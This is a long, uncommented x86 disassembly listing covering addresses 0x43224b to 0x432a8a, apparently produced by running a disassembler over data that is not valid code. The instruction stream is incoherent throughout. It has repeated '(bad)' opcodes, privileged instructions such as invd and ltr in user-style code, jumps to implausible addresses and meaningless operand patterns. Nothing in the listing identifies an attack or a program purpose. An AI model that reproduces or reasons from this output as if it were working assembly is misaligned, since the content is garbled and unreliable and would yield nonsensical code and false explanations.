  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
  432a1a:	or     BYTE PTR [ebp+0x7],cl
  432a1d:	lea    ebx,[ebx-0x748dcdff]
  432a23:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a2a:	mov    edx,DWORD PTR [eax]
  432a2c:	cld    
  432a2d:	dec    ebp
  432a2e:	push   esp
  432a2f:	sub    edx,DWORD PTR [ecx-0x75]
  432a32:	add    eax,0xf172fc
  432a37:	or     BYTE PTR [ebp+0x7],cl
  432a3a:	add    eax,ecx
  432a3c:	or     al,0x72
  432a3e:	add    DWORD PTR [eax],eax
  432a40:	mov    ebx,0x29c2c1
  432a45:	inc    ebp
  432a46:	mov    eax,DWORD PTR [ebx]
  432a48:	cmp    eax,0x3004d1c
  432a4e:	xbegin 0x66c8b648
  432a54:	clc    
  432a55:	or     BYTE PTR [ebp+0x45],al
  432a58:	xor    dh,BYTE PTR ds:0x78b089c
  432a5e:	adc    BYTE PTR [ebp+0x45],cl
  432a61:	lea    eax,[ebp+0x33727501]
  432a67:	add    cl,ch
  432a69:	inc    ebp
  432a6a:	add    bl,ch
  432a6c:	add    BYTE PTR [ebx+0x45850845],cl
  432a72:	je     0x4329ff
  432a74:	push   ebx
  432a75:	or     al,0x85
  432a77:	dec    ebp
  432a78:	std    
  432a79:	mov    bh,bh
  432a7b:	mov    BYTE PTR [ebp-0x75],al
  432a7e:	mov    edi,eax
  432a80:	or     al,0x89
  432a82:	inc    ebp
  432a83:	clc    
  432a84:	mov    esp,esp
  432a86:	hlt    
  432a87:	call   DWORD PTR [edi-0x37]
  432a8a:	push   esp
